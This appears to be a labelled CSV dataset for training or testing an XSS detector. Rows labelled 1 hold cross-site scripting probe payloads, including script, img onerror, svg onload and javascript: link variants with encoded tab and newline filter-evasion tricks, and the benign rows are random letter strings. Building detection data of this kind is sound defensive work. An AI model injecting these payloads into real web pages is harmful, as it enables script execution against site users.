payload,label
<a href=javascript:prompt(1)>click</a>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
asLHfrcTVFlZwugVvvKmfKSSYN ap,0
<details ontoggle=confirm()>,1
HWmRyDljoIWdiQNjOGjXBQK,0
<%09script>prompt(1)<%09/script>,1
uJZAcMjpgOQDwjoNgqqGIsnWSmE,0
vzsQeuceKeSMeElmLLeWqbpUTUu,0
tPlUQRSdMS,0
pFAwoBvhMLJJGrA,0
<%0aimg src=x onerror=prompt(1)>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09script>prompt(1)<%09/script>,1
BypyNRYTBgsrVdHMUJsaMEUB,0
<%0asvg onload=prompt(1)>,1
<img src=x onerror=prompt(1)>,1
nEbVbwEVRVaqIpsRYmMV FgZVd,0
<%09script>confirm(1)<%09/script>,1
<img src=x onerror=prompt(1)>,1
eUaFrZgjWThssneUQNohirw NbtIouiyxEDf,0
<%09img src=x onerror=prompt(1)>,1
<img src=x onerror=prompt(1)>,1
<%09img src=x onerror=prompt(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
wEokrkcUN DdltwlYSHRsfDnTMKyJ,0
YvRCxiePNrUSEnJOLbU,0
 Nee PoDThTPyBcipDPMvOxzUXvRhad,0
<%0adetails ontoggle=confirm()>,1
adWyhTnfFRSwTWWxxzWdfWiyehxrpfNUSJ,0
<%09details ontoggle=confirm()>,1
LoPoBJaTjhoJheGKa mzHvukziSrTVYfwglnGd,0
FRhYOTJFonCDMkrZwQihATBUC ,0
<svg onload=prompt(1)>,1
eiypmuHZnZxHMtmsZHfIEJlOCpqUfkgnMNr,0
pKICzhXCrHBolwIYuGOGJOkQipjydyWQXOErxKUz,0
<img src=x onerror=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
<%09script>confirm(1)<%09/script>,1
<svg onload=confirm(1)>,1
VSXxTTnryVBEKeulfvefArPwgYzbWq wwbW,0
<%0ascript>confirm(1)<%0a/script>,1
<img src=x onerror=confirm(1)>,1
geqWvdlanNYhpnxDkCSSmRzOaBTrnxBA xltf,0
<a href=javascript:confirm(1)>click</a>,1
vWAWvvRUsXJsZFIVWESsEoorD iBIJOC,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
 yyAYujjCyGeAQvdrPlUIdwIMvdlDEBVu,0
 gX SQOLJOfaE lqBVIAsCeXXX,0
ggBqBKjkHiYMRZhju,0
<%0asvg onload=confirm(1)>,1
<script>confirm(1)</script>,1
<details ontoggle=confirm()>,1
oznIjwDmeUzLqTckROffDhqQybqobIK,0
LUc vUZLVMNRysAHmx,0
<%09img src=x onerror=confirm(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
XagdZFLEjORRYwFRlpbowFRxU,0
<%09svg onload=confirm(1)>,1
Bn krGhHklUHLgBiuhhREPFdq,0
KwQWdtkEoRKcYVwZfJjLkgbGhpXvGkvxmFYuu,0
fMcufPBeQDccTyvdwYutM,0
IrGYGSyQYKcOZ,0
<%09details ontoggle=confirm()>,1
MhFxjgRxxvsEutZJ ncdPlkCciDhFfajv f,0
lPKKGxhGhvFZEY,0
grFCYJRUhQA,0
MhAWPxhNjBqSJlzWrSJbijcaYiROZwE f ,0
<details ontoggle=confirm()>,1
<%0adetails ontoggle=confirm()>,1
<%0ascript>prompt(1)<%0a/script>,1
qAhMMGOdAIbiIegGDbO,0
<%09img src=x onerror=prompt(1)>,1
<%0aimg src=x onerror=prompt(1)>,1
<%09svg onload=prompt(1)>,1
<%09img src=x onerror=prompt(1)>,1
<img src=x onerror=confirm(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
NEQwmmyseiglNxxbsCxKJliNBxBbOeQcRKFan,0
ZsuucTQLAZtbefOvgURpAEWeaNPDMFJ,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
aaDJkVPGPrbsKvKLGOjRWBn cNta,0
<%09details ontoggle=confirm()>,1
<%09svg onload=prompt(1)>,1
XpgEQsN vTcI eTgllDWVnKjKbrBfx,0
fQTvaDXdpPza,0
<%09script>confirm(1)<%09/script>,1
<%0ascript>confirm(1)<%0a/script>,1
UvPwvpqdDFEIpolYZINDjqGv,0
<%0adetails ontoggle=confirm()>,1
<%09svg onload=confirm(1)>,1
dxVrRKLFnWyHk gKzQzNpOTcJYWDBKRpCWGkwi,0
<img src=x onerror=confirm(1)>,1
NDcQPyoWgKBzhClNOTkgMePLbYV,0
<%09details ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
FXXODIBZUiNoa,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
ZpShfvxhNKdYK GYeMSubsXIqg,0
uJaOklUlpZWRgs FcYDCNKZa,0
WCAz HlCmDNCKrnJnVcRyEtZwahTZW,0
NVPxxUkzWgvLPIne,0
<svg onload=prompt(1)>,1
fsdvmsaRuVaEGCoveDYFzngucWSueAkBBvcZxLV,0
<%0asvg onload=confirm(1)>,1
BJmfRHOpVnfCBNdQmJlDm,0
ZxRixLwJJuhthqbCBvjkWp,0
EUbYEdOHgAgdloXDhHHCSsBYGqqW hYPUFOSoctr,0
<%0adetails ontoggle=confirm()>,1
yTMMoxtNJQgiT,0
gingrJMQfVGBFARs,0
vBUGRGHuPfPkBddeNwbAQ,0
<img src=x onerror=prompt(1)>,1
bgKHECzWrrdqg sLIHhEquhYWjFdhxNjtzEu OhA,0
xvWI gdImgMzlUGJUghzq,0
<img src=x onerror=prompt(1)>,1
<%0asvg onload=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
eDkSuyLqXuEXFIdloIfvezeL,0
<%0aimg src=x onerror=confirm(1)>,1
mFnbLUkauUOfWodFoBAHTFLHKdcDiNdCWOo,0
FWHGwkxACeg wqmja ePpGdXQgi,0
fpFKuDYRT wggfaosnjvFUH,0
<%0aimg src=x onerror=prompt(1)>,1
vRgSsHX KOSewnR,0
<img src=x onerror=prompt(1)>,1
<svg onload=confirm(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
UU iVTENCRakRZAGtENbwnlsYUH,0
UUNvLZfoOxkIgXyoAvQZKulQXArM,0
aMfQENrOelyHvIBUCHlGBnofG,0
KAgzQYuQ fQ zAOTBJA,0
<%09script>prompt(1)<%09/script>,1
<img src=x onerror=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
<%0asvg onload=confirm(1)>,1
skVYyffWbYsrrvbYZkpMnYeBp,0
<details ontoggle=confirm()>,1
<%0aimg src=x onerror=confirm(1)>,1
<details ontoggle=confirm()>,1
<svg onload=confirm(1)>,1
PdEPLImYrEVYODybeiopU,0
ECSIQFqIGgnwaarrU,0
<details ontoggle=confirm()>,1
OHARA ynyyyzmeztVFPPFdJTFU,0
<a href=javascript:prompt(1)>click</a>,1
<script>prompt(1)</script>,1
INdbmFVRPrpBUMiJpa,0
xWUSEbATwizLVnAyCRkUCgGCIPGgBBdMMS,0
<svg onload=prompt(1)>,1
<%09script>confirm(1)<%09/script>,1
<svg onload=prompt(1)>,1
jvvzeICDBDMFLspSjngye sDlZHoKKqwctCtWr,0
vSCAWOhOsDsmKb,0
<details ontoggle=confirm()>,1
 BTUCEMFTfsrMkUsJ,0
BLhZ fD J PlPNKnFiqLDbHDuLnVsZSQiNLTb,0
pcTHvZfWBXdpSbAjeScHPLJfjkMg,0
mntzdZgTQnQyJNZ,0
snuqZiDkAGefkIVa,0
iMcsYVapFMccipxahMvvoDpLcrisi,0
<a href=javascript:prompt(1)>click</a>,1
eRBAxEsBAXmLnxLzu,0
BKCLqnZMnefizSZ,0
cdyCyEuPZcw,0
<%0aimg src=x onerror=confirm(1)>,1
<script>confirm(1)</script>,1
 ppBusElWTQcdtxB,0
<svg onload=confirm(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
eRfapAmJFpiwlxUgVhR,0
<%0asvg onload=confirm(1)>,1
XIgUYwiBjjdnJAN,0
sXthbXNxlvl yDG,0
CRtdweSVJdidFOYoLAupoH,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
vIjzma z ourcXHblmIBYzvpOBob,0
dWnNIjhZyYbjD,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%09svg onload=confirm(1)>,1
tXEXvFBqwclolGDjkURTu,0
<script>confirm(1)</script>,1
<%0aimg src=x onerror=confirm(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
udVTVRMYLTCzflMZZOyukjJ,0
<%09script>confirm(1)<%09/script>,1
ZZaMfOTlFWp,0
<details ontoggle=confirm()>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0adetails ontoggle=confirm()>,1
yVp EvRNoxGukKRKpTAvm,0
DgqyPiHibYRMLFvsUjSGHNOtPFG,0
<img src=x onerror=confirm(1)>,1
<%09img src=x onerror=confirm(1)>,1
<script>confirm(1)</script>,1
sDnBsoaoGAodczNDgKZxQTaOzS,0
haYbTCePKOJWZwCgXssGMnEN,0
eUsEKzTIRNxqpEOJxPdSbZvrc,0
<%09svg onload=prompt(1)>,1
yJefNeuWB xQBqEdFFQfnJqU PG,0
<svg onload=prompt(1)>,1
SvdlaNZwjXuWPdYPhknTsrmDVHvM,0
qsJxOgcNxcXjTQnkDxdqVKYJtNqEnHjxy,0
JylrffHiUfnokwifltl Imw,0
<script>confirm(1)</script>,1
XhzBQbbiFBB,0
<%09script>confirm(1)<%09/script>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
vPXWbMVDEGii,0
QKToYXMnyZPRvAurJmfrQDI,0
NmCEnlq ADPQUirGAqP PNJugbaTOBHrZXUx,0
kWbXhwufvaaRggUOlMcR,0
<details ontoggle=confirm()>,1
eqgIytHJrAUWOsojcmwfpTxKtNMfdLNNmBIRnva,0
KTGVgNnoTvWxiTZ,0
q DmdithciL,0
<img src=x onerror=confirm(1)>,1
zowvTmflXOxbsHkFdbJArSghUfwGsHcSyHZy,0
dCsGXINeXCUKe,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
PjqQasMKqTEyavbLLpW,0
<%09script>prompt(1)<%09/script>,1
<%0adetails ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09details ontoggle=confirm()>,1
<%09svg onload=confirm(1)>,1
sSoHwiZwZtxcpXvWqwjXlFJpJhyOc,0
<%0ascript>confirm(1)<%0a/script>,1
lpTqvMXTIkldjr,0
<%09details ontoggle=confirm()>,1
LSTfrSCXIDYCswXfji juvNYvKMViloCzwK,0
<%09details ontoggle=confirm()>,1
<%09img src=x onerror=confirm(1)>,1
<%09details ontoggle=confirm()>,1
YVdGylwXRvdtKXeFImXwLzCwrZo,0
rqKXXZaYlxFUZHJoGbzKYHvQpAcwcNOzjG,0
<svg onload=confirm(1)>,1
<script>prompt(1)</script>,1
<%09img src=x onerror=confirm(1)>,1
lBQIZnjfYNmtreZwowvrG yYQtHLyxQpJGx,0
kvuSHXpzWynYAHJaAH rigrX,0
<svg onload=confirm(1)>,1
IWgPQtwxTUKuenVeBktYunHz,0
spkAFHwpf eBrVO dANBV NWt cmdHB,0
<details ontoggle=confirm()>,1
<%0asvg onload=confirm(1)>,1
<a href=javascript:confirm(1)>click</a>,1
LANqzInxnsVoVVDM,0
<%0adetails ontoggle=confirm()>,1
NcTIevC LenGdUgzaupLihsVWYOjZcpLNZPzg,0
uFFxHBUhSGWAsreNQNYSpN,0
sdIONeLAtiRVcOeqn KIiasqfNSolAAPYnHdorN,0
ghdreVeMey wSVaAkAyGewCtj,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0adetails ontoggle=confirm()>,1
cRQCXoksUfCVZJcLdHxTgWwOWE,0
<%09script>confirm(1)<%09/script>,1
IKdKedGCBTciganvYYSmnvTqSDUtdHjhzvFUn,0
<details ontoggle=confirm()>,1
GHLZjTasvS rOhcFnLzVovVox,0
kyLBJgkLjxTuGwhChsOHmbMQEhR,0
FJuYzCRNMlluODSFen,0
<details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
CSGMtIFxfwkNbtlX,0
MMKzmHALNWIYhuVXnqUADytZi fjrToIvPHjL,0
<%0ascript>confirm(1)<%0a/script>,1
<%09details ontoggle=confirm()>,1
<svg onload=prompt(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
MKQxUEfDivtNswyoYUfwUzFPsPDJkW,0
O OMTaSqjolyzLXjskcbNRzngOrChUraoosCROKP,0
<%0asvg onload=confirm(1)>,1
AXZEUgDrnMpMCSYRzxZvvkJowvkq,0
NyyhOnSGTjYuJlMCA,0
<%09img src=x onerror=prompt(1)>,1
almfsSmlDvCoQEGcds,0
SVkEcZOOdpaXvzwukKjfzSMeSrCryp,0
<%0ascript>prompt(1)<%0a/script>,1
<%0aimg src=x onerror=prompt(1)>,1
<svg onload=prompt(1)>,1
<%09script>confirm(1)<%09/script>,1
UBYt MQLigeQDk,0
<%0aimg src=x onerror=prompt(1)>,1
<%09img src=x onerror=confirm(1)>,1
qFyjwbGoToFSRFDkUSsYObFcSksNTJB SFT,0
TnUGRlHGijqhTmnWJieJkPwDqhgpurQk,0
<%09img src=x onerror=confirm(1)>,1
zbGZszrfvDlMsISFRisYyDgAxeMVqYZrsjSzWKFa,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<details ontoggle=confirm()>,1
rKwRzbLPLXpVfkgLKLJSAX KVxgvw,0
<%09svg onload=confirm(1)>,1
dJiUCDiNahkmH,0
xNnwllL YcAIBc TvomYrkTyaBcsO,0
<script>confirm(1)</script>,1
VOEXDYkWnFlpL,0
<%0adetails ontoggle=confirm()>,1
<a href=javascript:confirm(1)>click</a>,1
OYnmJrsieazSTlWpGoOifvNOdPNwkzAPUIyTt,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
QFFKgioxqAMRQmHe,0
<svg onload=confirm(1)>,1
EhVpurtiOvIzOXytcTBWPKucqEkUDiopQXAiNWht,0
LQvmEHaESXIphCByo ykaZKvqMPsFfm,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
gcpKRrLUNMjEfmR,0
cYVmkTPkcnayH,0
<svg onload=confirm(1)>,1
YuwDIFvssmXLYcbbl,0
<img src=x onerror=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
<%09svg onload=prompt(1)>,1
<svg onload=confirm(1)>,1
<%0aimg src=x onerror=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
<%09img src=x onerror=prompt(1)>,1
<svg onload=confirm(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
<%09script>prompt(1)<%09/script>,1
<a href=javascript:prompt(1)>click</a>,1
gGRuXkWsfqg,0
HpQbqSAKtWfBTzHpyXioRzOGrQBZjVeZuIFVBof,0
LeqYgpSzwWJpeNGICIVdmSMixKYK xaP,0
<%09img src=x onerror=confirm(1)>,1
 CSekRqJXHonI,0
JsatSEyVEVyVRNvqXdj M,0
rEuORAsrNKJvikEzYCFLnPGyClwDkQioVVTjzPG,0
okgwGKdBAHKYPjVqqRD,0
<%09svg onload=confirm(1)>,1
KrHLkpkmxfPzhgniEuAlYB,0
<svg onload=prompt(1)>,1
esg bbnyixaRGuxMZDJiripnsPEAI,0
<%09script>prompt(1)<%09/script>,1
PHDKVmGktAE,0
ehAbISAhIJfogWCesHDmKenCCpUXFOEecRWE,0
LpXYkWgGXnWww RhWK,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%0asvg onload=confirm(1)>,1
eMiNSBEImANSEvVRVTseXEmKHMlNfTQx,0
fIBDBr EXsUb,0
m OFPFDtULDQIcZWWSIaxMIxekHveqzTcLtey,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
SuMrDJCzovkgBIKpcimIJrovIIEZz,0
oxAPCaLlGcEGYBXeT,0
<svg onload=confirm(1)>,1
BclXiieDJsQVUAcDKof,0
<details ontoggle=confirm()>,1
AJmUpdXFcZJVSxhilo w,0
VmpxIKKBy zKUYnwWQpXiPzdTV,0
<%0ascript>confirm(1)<%0a/script>,1
xsoOVMdhTyAFFChHTINAyeQfHT,0
<%09img src=x onerror=confirm(1)>,1
<details ontoggle=confirm()>,1
S bAmiMQjtipidQqirfJnl,0
UZoqgvARuGGpnfpQrOZXrZntVyrKQaZxQ,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
pKmDNbxtwiXGOL TJAuDpwU,0
<%09svg onload=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
NKxuKBhoumRXyjhnZDBgZd,0
oDpLMVzKETwGuIHBcimAT,0
<%09script>confirm(1)<%09/script>,1
<details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
<a href=javascript:confirm(1)>click</a>,1
<%09details ontoggle=confirm()>,1
<a href=javascript:confirm(1)>click</a>,1
<details ontoggle=confirm()>,1
mJvk vqcWAqWyzueICgYmQTwoJxeiwu,0
HArjkwqzTLhn,0
rHcIsDWKmMWnxryglF,0
LHNFGudbNkq FuwQYZ,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
qzGXSbrCMzJpK,0
<%09details ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
frlEdhYNhZzoUIvMrOOUbp,0
tJIXKWPaDYBfTzz,0
OJaloLeAKdGcaHvcCqOyidFS gFXgTRGdUtwZWhm,0
XniZNmSBWcORaLmempNCd,0
GFkOcAZmJbqisjb MusBhNQSyDd,0
GewAFOayhiup OeSsrejXAjT,0
xfWXmFRczVmj,0
<svg onload=prompt(1)>,1
EQJoaoidpKzBlFZGEHvbWmuRonv EPMemkD,0
xDpkeeuEJbqNzNBIBfbsGGXEXjvYqSrGfl,0
<details ontoggle=confirm()>,1
iLnSlXVLaYZpJwkQEYtoFvJhrlPaayHtqwvzScs,0
<details ontoggle=confirm()>,1
<script>confirm(1)</script>,1
<a href=javascript:prompt(1)>click</a>,1
<%0aimg src=x onerror=confirm(1)>,1
mFxThefXZY dhAzBBtuMYpfXKLjFc,0
rxVmrlU aF,0
<%09details ontoggle=confirm()>,1
GJUoNKphTsij,0
<%09details ontoggle=confirm()>,1
<%09script>prompt(1)<%09/script>,1
<img src=x onerror=prompt(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09svg onload=prompt(1)>,1
<%09svg onload=prompt(1)>,1
cieeupCTLW uoYvPqhf,0
tOjbw GondKvxql PZIG,0
fJvHuDPyMvZZsWu,0
 mdQklsnQKWpEcTunw,0
fyHTwJVsUpHqZJMBfNuPCxnyNmmMh,0
OCy uoCeVfGQffccGoRyUWaPCkrjiI,0
<%0aimg src=x onerror=confirm(1)>,1
FqKiBumDMmgMnAsxAIRFZDYPgyWnDUqfHar,0
CAwu xusEUaeABMtORjZxACUMvOXS,0
tJTNCqAbgDRUyIxpDjpnPgRWVJDQyTtl,0
jpFdpTdYnrlgOF XBxL,0
<%0asvg onload=confirm(1)>,1
<svg onload=prompt(1)>,1
Vq KusOlXicNIXTcY,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
iOFJbnahGrHdXZRFUM,0
<details ontoggle=confirm()>,1
myDbBteFQDMhcQevXTdvP,0
DlJg BzjuhLtlYfYcltX,0
hetEtDFAFMzo,0
<details ontoggle=confirm()>,1
PG tdPuAO bDUiPebqaPtKqENgJoQWwmVD,0
<%09svg onload=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
WAAYGeAzqWxaeYECUefNOeueuHIzXzpNa,0
<%09svg onload=confirm(1)>,1
<a href=javascript:confirm(1)>click</a>,1
PpVYrbQhgRqeWgyGEueZDrVvY,0
BbdKyOkogkLT,0
<%0adetails ontoggle=confirm()>,1
dyLdfTPDSOrlGb xwsOPfC,0
<%0adetails ontoggle=confirm()>,1
<%09script>prompt(1)<%09/script>,1
XnvRaoQMomVdxhMI,0
zgGuIngbTIBai cmYFjhvppuPxzOAtZXCYsQBI,0
rclxYdnzRLbDvtHhRbZ oyoVwnV,0
UtGpbgbORbCjmnIqOSamfYyRtilRaUKIL,0
<a href=javascript:confirm(1)>click</a>,1
WNomtLbs EEfu,0
FaMNjQJqfhwW,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
MrVkTqA yHhNJCBpsJTdoGqHmRHV,0
dDLfeEIPITEDLwJplrWEZQKdazt SAmjfLB,0
TJPsykmn CqDJLWgeVMMbMeINxWSKonlyr,0
OknPZJBJjQ,0
gKmKmtTcHkNB,0
WlaqXbRpeLWCmwko,0
<%09img src=x onerror=prompt(1)>,1
AJzvZVTFtrtYhESEWNieQHw,0
RHzajCwjOVeVARUBPsWBKISXRJitvAaxDPalp,0
JlYrqQktxJRtYQqJfgewGsdEfUItxNuD,0
<svg onload=prompt(1)>,1
ptsDbdEDijmBvzHeMXQiPmDeUm,0
NJxu YgFIWGQcIBEAtbFg,0
ynTDzEQkNcIpQhl,0
tbcJzkrkxVVRcuEwODIsHlwtAYvCV,0
<script>confirm(1)</script>,1
XKhXSrtgudyJ uGEQqfuSiJNVFKJeLaIz mkXxZZ,0
HbyUnaCfarGsrCvttZJErAQMulimFCNw slSs,0
ShLpnBqKWPySyTPIcJh,0
MgBRBWfvIotLPlRysidCP,0
FFppTdKeBhwJjxQnQocWXK,0
mLNOZQgodeWxzEHeDpwc,0
GMFNqkCrlLdrgNrTvzviWzVPQm,0
<img src=x onerror=confirm(1)>,1
<%0ascript>confirm(1)<%0a/script>,1
GljqUkaCsrboEUrRIVXYbAxlLDbRwL,0
<%09script>confirm(1)<%09/script>,1
<%09script>confirm(1)<%09/script>,1
GvOFoMSqebV Eashw,0
CxzwIIYfUu SqxriBc,0
ghzhCALInCNDAsAX,0
sWduIqKANyRbtZwmXpEJa WupU,0
cqwrjlIfavQvFQMIdgzSZyB,0
<%09script>prompt(1)<%09/script>,1
<%0ascript>prompt(1)<%0a/script>,1
LMeyTBKFaTQKvoKA rwkfrzhvsUfMUUPTOYnWfoi,0
bHzTsdYc BZenVCYsgNcmnELaMzCWYhtS,0
ixNCiOzsXJWsZlsHKRrgacfnbLCbLMZrVucLRhkv,0
eCDzUORkgxoaWzUZRegJhCuAONTqLiHh,0
QQwXXMthoysRBLKRNXi,0
<svg onload=confirm(1)>,1
<details ontoggle=confirm()>,1
 KrSwFJuYDVWYmMYRWrib,0
kachnFHyRzPvVTEZ RPbjdAItBxcDrmv,0
xxhOwyWqudQV,0
<script>prompt(1)</script>,1
jMvuPADFVnDYwsN ilLkZruUETGvnuDzBC,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<script>confirm(1)</script>,1
<details ontoggle=confirm()>,1
uLJBboeQsJoarNZAvYjSoxXynF,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
QSlEfxgEjjJDxuTegkhpM,0
<%09details ontoggle=confirm()>,1
mQZMqkfdAo,0
oGiYklPrBWYxcO,0
<a href=javascript:confirm(1)>click</a>,1
<%09img src=x onerror=prompt(1)>,1
<%0aimg src=x onerror=prompt(1)>,1
RkpFqwyArMOvMKEJVfDsn CliQAwQXM,0
yGJc GRghS LXcbdnvN,0
<details ontoggle=confirm()>,1
ucPCcEMBmgPhuhjiAsNzpC,0
ieMAMijQkoK,0
QriMmdQVYr N,0
bxmzXrOaakhwPstfDkmyBDMl,0
ozWaMcOEJBEUHu,0
ljzNJBNoMGpmVjxb,0
EapHOSJEJynlYlcsMZdiMNDoUVl,0
TlaqoITakoITiWuJeh,0
wFrLRlGVvLNvjJFHNHz,0
cNGrTuOKFNBQYhkD,0
xOBdaFLksywIJOqnJHvW,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
ZJaGzpK VPFGvWSCGUukhpCzaw BKCKvSQOhduK,0
IwTLYLpefqBbSnrCq,0
trGrNo JdfygCu,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
ERDCcNOth NBupMUNenwvUivXIRkCVroX,0
fLdEivQsTdqCpxSzGPZAZAyyUpWexhbbHF,0
<%0asvg onload=prompt(1)>,1
akDxEhKfkGDkZfdyMLPWhAAAuqfgP,0
DDQCMZtTCHrwJjeQnGZNxWDBnprgoyLPoEM,0
<svg onload=confirm(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<script>prompt(1)</script>,1
